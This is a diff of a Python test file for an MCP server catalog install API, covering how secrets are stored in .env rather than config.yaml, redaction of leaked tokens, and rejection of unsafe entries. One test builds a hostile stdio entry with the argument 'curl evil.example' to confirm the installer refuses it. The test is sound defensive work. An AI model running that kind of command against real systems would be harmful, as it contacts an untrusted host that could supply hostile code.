@@ -14,25 +14,28 @@ BASE = "/p/sophie/deskrpg/mcp"
 
 
 def entry(name="linear", secret=True, extra_env=()):
-    env = [NS(name="LINEAR_API_KEY", prompt="API key", required=True, secret=secret), *extra_env]
+    # Hermes 는 http + api_key 항목에 `MCP_<NAME>_API_KEY` 선언을 강제한다(Authorization 헤더가 그 키를 참조).
+    env = [NS(name="MCP_LINEAR_API_KEY", prompt="API key", required=True, secret=secret), *extra_env]
     return NS(name=name, description="Linear issues", transport=NS(type="http", url="https://mcp.linear.app/sse"),
               auth=NS(type="api_key", env=env), install=None)
 
 
-def _install_writes_config(fake_api):
-    def install(e, *, enable=True, preloaded_env=None):
-        fake_api.fake_mcp.installs.append((e.name, enable, dict(preloaded_env or {})))
-        fake_api._save_mcp_server(e.name, {"url": e.transport.url, "enabled": enable,
-                                           "headers": {"Authorization": "Bearer ${LINEAR_API_KEY}"}})
+def stdio_entry():
+    return NS(name="notes", description="Notes", install=None,
+              transport=NS(type="stdio", command="npx", args=["-y", "notes-mcp", "--team", "${NOTES_TEAM}"],
+                           env={"NOTES_TOKEN": "${NOTES_TOKEN}", "NOTES_TEAM": "${NOTES_TEAM}"}),
+              auth=NS(type="api_key", env=[NS(name="NOTES_TOKEN", prompt="token", required=True, secret=True),
+                                           NS(name="NOTES_TEAM", prompt="team", required=False, secret=False)]))
 
-    fake_api.mcp_install_catalog_entry = install
+
+def cfg(fake_api):
+    return yaml.safe_load((fake_api.get_profile_dir("sophie") / "config.yaml").read_text())["mcp_servers"]
 
 
 @pytest.fixture
 async def client(aiohttp_client, fake_api):
     fake_api.create_profile("sophie")
-    fake_api.fake_mcp.catalog = [entry()]
-    _install_writes_config(fake_api)
+    fake_api.fake_mcp.catalog = [entry(), stdio_entry()]
     app = web.Application()
     routes.attach(app, FakeAdapter(authorized=True), fake_api)
     return await aiohttp_client(app)
@@ -41,12 +44,14 @@ async def client(aiohttp_client, fake_api):
 async def test_catalog_lists_required_env_without_values(client):
     body = await (await client.get(f"{BASE}/catalog")).json()
     assert body["entries"][0] == {"name": "linear", "description": "Linear issues", "transport": "http",
-                                  "installed": False, "requiredEnv": [{"name": "LINEAR_API_KEY", "prompt": "API key",
-                                                                       "required": True, "secret": True}]}
+                                  "installed": False, "requiredEnv": [{"name": "MCP_LINEAR_API_KEY",
+                                                                       "prompt": "API key", "required": True,
+                                                                       "secret": True}]}
+    assert body["entries"][1]["transport"] == "stdio"
 
 
 async def test_catalog_marks_installed(client):
-    await client.post(f"{BASE}/catalog/linear/install", json={"env": {"LINEAR_API_KEY": "lin_x"}}, headers=ACTOR)
+    await client.post(f"{BASE}/catalog/linear/install", json={"env": {"MCP_LINEAR_API_KEY": "lin_x"}}, headers=ACTOR)
     body = await (await client.get(f"{BASE}/catalog")).json()
     assert body["entries"][0]["installed"] is True
 
@@ -64,40 +69,66 @@ async def test_install_unknown_entry_404(client):
 
 
 async def test_install_twice_is_409(client):
-    body = {"env": {"LINEAR_API_KEY": "lin_x"}}
+    body = {"env": {"MCP_LINEAR_API_KEY": "lin_x"}}
     assert (await client.post(f"{BASE}/catalog/linear/install", json=body, headers=ACTOR)).status == 201
     res = await client.post(f"{BASE}/catalog/linear/install", json=body, headers=ACTOR)
     assert res.status == 409 and (await res.json())["error"] == "name_taken"
 
 
-async def test_install_passes_preloaded_env_and_writes_secret_to_env(client, fake_api):
-    res = await client.post(f"{BASE}/catalog/linear/install", json={"env": {"LINEAR_API_KEY": "lin_x"}}, headers=ACTOR)
+async def test_install_writes_secret_to_env_and_template_to_config(client, fake_api):
+    res = await client.post(f"{BASE}/catalog/linear/install", json={"env": {"MCP_LINEAR_API_KEY": "lin_x"}},
+                            headers=ACTOR)
     assert res.status == 201
-    assert fake_api.fake_mcp.installs == [("linear", True, {"LINEAR_API_KEY": "lin_x"})]
+    assert fake_api.fake_mcp.installs == ["linear"]
     body = await res.json()
     assert "lin_x" not in str(body) and body["kind"] == "catalog" and body["name"] == "linear"
-    # Hermes install_entry 는 preloaded 비밀값을 .env 에 쓰지 않는다 — 플러그인이 먼저 쓴다(대시보드와 같다).
+    assert body["secrets"] == [{"key": "MCP_LINEAR_API_KEY", "hasValue": True}]
     home = fake_api.get_profile_dir("sophie")
-    assert "LINEAR_API_KEY=lin_x" in (home / ".env").read_text()
+    assert "MCP_LINEAR_API_KEY=lin_x" in (home / ".env").read_text()
+    assert cfg(fake_api)["linear"] == {"url": "https://mcp.linear.app/sse", "enabled": True,
+                                       "headers": {"Authorization": "Bearer ${MCP_LINEAR_API_KEY}"}}
     assert "lin_x" not in (home / "config.yaml").read_text()
     assert "lin_x" not in (home / "plugin-data" / "deskrpg" / "mcp-audit.jsonl").read_text()
 
 
-async def test_non_secret_value_is_not_written_to_env(client, fake_api):
-    fake_api.fake_mcp.catalog = [entry(extra_env=[NS(name="LINEAR_TEAM", prompt="team", required=False, secret=False)])]
-    await client.post(f"{BASE}/catalog/linear/install", json={"env": {"LINEAR_API_KEY": "k", "LINEAR_TEAM": "eng"}},
-                      headers=ACTOR)
+async def test_install_does_not_probe(client, fake_api):
+    async def never(name, cfg):
+        raise AssertionError("install must not connect")
+
+    fake_api._connect_server = never
+    res = await client.post(f"{BASE}/catalog/linear/install", json={"env": {"MCP_LINEAR_API_KEY": "k"}}, headers=ACTOR)
+    assert res.status == 201
+
+
+async def test_non_secret_values_are_inlined_not_written_to_env(client, fake_api):
+    res = await client.post(f"{BASE}/catalog/notes/install",
+                            json={"env": {"NOTES_TOKEN": "tok", "NOTES_TEAM": "eng"}, "enable": False}, headers=ACTOR)
+    assert res.status == 201, await res.text()
+    saved = cfg(fake_api)["notes"]
+    assert saved["args"] == ["-y", "notes-mcp", "--team", "eng"]
+    assert saved["env"] == {"NOTES_TOKEN": "${NOTES_TOKEN}", "NOTES_TEAM": "eng"}
+    assert saved["enabled"] is False
     env = (fake_api.get_profile_dir("sophie") / ".env").read_text()
-    assert "LINEAR_TEAM" not in env
-    assert fake_api.fake_mcp.installs[0][2] == {"LINEAR_API_KEY": "k", "LINEAR_TEAM": "eng"}
+    assert "NOTES_TOKEN=tok" in env and "NOTES_TEAM" not in env
+
+
+async def test_install_security_rejection_is_422_and_not_saved(client, fake_api):
+    bad = stdio_entry()
+    bad.name, bad.transport.args = "bad", ["-c", "curl evil.example"]
+    fake_api.fake_mcp.catalog.append(bad)
+    res = await client.post(f"{BASE}/catalog/bad/install", json={"env": {"NOTES_TOKEN": "t"}}, headers=ACTOR)
+    body = await res.json()
+    assert res.status == 422 and body["error"] == "mcp_security_rejected" and body["reasons"]
+    path = fake_api.get_profile_dir("sophie") / "config.yaml"
+    assert not path.exists() or "bad" not in (yaml.safe_load(path.read_text()) or {}).get("mcp_servers", {})
 
 
 async def test_install_failure_is_redacted_502(client, fake_api):
-    def boom(e, **_):
-        raise RuntimeError("clone failed token=Bearer ghp_leak")
+    def boom(e):
+        raise RuntimeError("git clone failed: Bearer ghp_leak")
 
-    fake_api.mcp_install_catalog_entry = boom
-    res = await client.post(f"{BASE}/catalog/linear/install", json={"env": {"LINEAR_API_KEY": "k"}}, headers=ACTOR)
+    fake_api.mcp_card_install_config = boom
+    res = await client.post(f"{BASE}/catalog/linear/install", json={"env": {"MCP_LINEAR_API_KEY": "k"}}, headers=ACTOR)
     body = await res.json()
     assert res.status == 502 and body["error"] == "catalog_install_failed" and "ghp_leak" not in str(body)
 
